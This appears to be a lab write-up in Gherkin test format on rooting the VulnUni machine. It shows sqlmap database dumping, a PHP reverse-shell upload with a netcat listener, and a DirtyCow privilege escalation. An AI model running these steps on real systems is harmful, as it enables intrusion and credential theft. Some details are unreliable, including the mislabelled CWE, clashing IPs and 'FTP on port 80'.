## Version 1.4.1
## language: en

Feature:
  TOE:
    VulnUni
  Category:
    SQL Injection
  Location:
    182.168.0.32:80
  CWE:
    CWE-250: Improper Neutralization of Special Elements used in an SQL Command
  Rule:
    REQ.173 Discard unsafe inputs
  Goal:
    Gain access a root user
  Recommendation:
    OpenEclass version 1.7.2 should be updated to a more recent version

  Background:
  Hacker's software:
    | <Software name> | <Version>   |
    | Kali Linux      | 2020.1      |
    | Firefox Quantum | 68.20esr    |
    | Nmap            | 7.80        |
    | Gobuster        | 3.0.1       |
    | SqlMap          | 1.4.3       |
  TOE information:
    Given I'm accessing the server 192.168.0.32
    And FTP is open on port 80
    And is running on Ubuntu 2.2.22

  Scenario: Normal use case
  The server has access to HTTP
    Given I'm scanning the server
    """
    $ nmap -sV -sC -p- 182.168.0.32
    """
    When I see the open ports
    """
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
    |_http-server-header: Apache/2.2.22 (Ubuntu)
    |_http-title: VulnUni - We train the top Information Security Professionals
    """
    Then I decide to enter port 80 to see the website

  Scenario: Static detection
    Given the vulnerability is in the source code of OpenEclass 1.7.2
    And that's why I don't have access to that code

  Scenario: Dynamic detection
  In this section I will look for the EClass panel
    Given I have a port 80
    When I decide to enter that port
    Then there's a very nice website
    And I decide to look for directories
    """
    gobuster dir -u http://192.168.0.32/ -w
      /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
      -x php,txt,html
    """
    When I generate some directories as a result
    """
    /images (Status: 301)
    /index (Status: 200)
    /index.html (Status: 200)
    /about (Status: 200)
    /about.html (Status: 200)
    /contact (Status: 200)
    /contact.html (Status: 200)
    /blog (Status: 200)
    /blog.html (Status: 200)
    /css (Status: 301)
    /courses (Status: 200)
    /courses.html (Status: 200)
    /js (Status: 301)
    /fonts (Status: 301)
    /teacher (Status: 200)
    /teacher.html (Status: 200)
    """
    Then I start seeing one by one but there's nothing interesting
    And he made the decision to start reading the website code
    When I see that among all this code there is a comment that catches my attention
    """
    <!-- Disabled until a new version is installed -->
    <!-- <li class=nav-item><a href="vulnuni-eclass-platform.html"
    class="nav-link">Class platform</a></li> -->
    """
    Then I decide to go into that HTML page that's in the comment
    And it turns out to be the EClass panel

  Scenario: Exploitation
  In this section I will enter as an admin to the EClass panel
    Given I found the EClass panel
    When I decide to try several credentials by default and none of them work
    Then I remembered the comment in the code
    And I see that the version of EClass is 1.7.2
    When I Google an "exploit" for that version
    Then I get several "exploits" but I decide to use this
    """
    https://www.exploit-db.com/exploits/48163
    """
    And in that "exploit" they explain how to make the "shell_reverse"
    When I decide do the "SQL Injection" to enter the panel
    Then I use "SqlMap" to find certain information first
    And the first instruction is this
    """
    $ sqlmap --url http://vulnuni.local/vulnuni-eclass/ --forms --dbs
    """

    When the result is the databases that exist
    """
    available databases [5]:
    [*] eclass
    [*] information_schema
    [*] INFOSEC100
    [*] mysql
    [*] performance_shema
    """
    Then I decide to look for the users that exist
    """
    $ sqlmap --url http://vulnuni.local/vulnuni-eclass/ --forms
      -D eclass --tables
    """
    And as a result there are several users
    """
    Database: eclass
    [16 tables]
    +--------------+
    | admin               |
    | user                |
    | annonces            |
    | cours               |
    | cours_faculte       |
    | cours_user          |
    | faculte             |
    | institution         |
    | loginout            |
    | pma_bookmarl        |
    | pma_column_comments |
    | pma_pdf_pages       |
    | pma_relation        |
    | pma_table_coords    |
    | pma_table_info      |
    | prof_request        |
    +--------------+
    """
    When with these results I will look for a user with its respective password
    """
    $ sqlmap --url http://vulnuni.local/vulnuni-eclass/ --forms
      -D eclass -T user --dump
    """
    And the result is successful because I found the password for "Admin"
    """
    | username  | | password  |
    | admin     | |ilikecats89|
    """
    When I successfully access the panel I start doing the
    "shell_rever"
    Then I go to the "exploit" I found and perform the steps they recommend
    And these are the steps
    """
    Once you have logged in as admin:
    1) Navigate to 127.0.0.1/modules/course_info/restore_course.php
    2) Upload your .php shell compressed in a .zip file
    3) Ignore the error message
    4) Your PHP file is now uploaded to
      127.0.0.1/cources/tmpUnzipping/[your-shell-name].php
    """
    When I search for a "shell_reverse" in PHP to compress
    Then I go to the route that the "exploit" say to upload the "shell_reverse"
    And before I launch it, I have to run a server like this
    """
    $ nc -nvlp 443
    """
    When I already have access to the server but as a "www-data" user
    And that's when I have to climb privileges
    When I to execute this instruction
    """
    $ find / -type f -perm -u+s
    """
    Then I see that it doesn't work this way
    And I decide to do it with the Linux Kernel but I must know its version
    """
    $ uname -r
    """
    When I Google an "exploit" for "Kernel 3.11.0-15-generic"
    Then I find out that Kernel has a vulnerability named "DirtyCow"
    And I found a "C-language exploit"
    When I downloaded that exploit into the victim machine using "Wget"
    Then I have to generate the "Run" file of the "Exploit" and I put this
    """
    $ gcc -Wall -o run dirtycow-mem.c -ldl -lpthread
    """
    When I already have the "Run" I must give permissions like this
    """
    $ chmod 777 run
    """
    And finally I execute it
    """
    /.run
    """
    When I perform all those steps I already have "root" access

  Scenario: Remediation
    Given EClass 1.7.2 has a vulnerability internally
    When I research how to remedy the vulnerability
    And the solution is to upgrade to a newer version

  Scenario: Scoring
  Severity scoring according to CVSSv3 standard
  Base: Attributes that are constants over time and organizations
    5.3/10 (medium) - AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L
  Temporal: Attributes that measure the exploit's popularity and fixability
    4.9/10 (medium) - E:X/RL:O/RC:X
  Environmental: Unique and relevant attributes to a specific user environment
    6.1/10 (medium) - MAV:A/MAC:L/MPR:L/MUI:N/MS:U/MC:N/MI:L/MA:L
